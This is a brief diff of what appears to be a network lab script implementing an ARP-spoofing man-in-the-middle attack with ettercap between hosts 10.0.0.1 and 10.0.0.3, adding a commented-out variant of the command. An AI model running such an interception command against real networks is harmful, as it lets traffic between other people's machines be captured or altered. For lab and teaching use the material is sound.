@@ -2,6 +2,7 @@
 #
 # implements the MitM attack via ARP spoofing
 
+#ettercap -T -i attacker-eth0 -M arp /10.0.0.1// /10.0.0.3// -s 's(5)q'
 ettercap -T -i attacker-eth0 -M arp /10.0.0.1// /10.0.0.3//
 
 
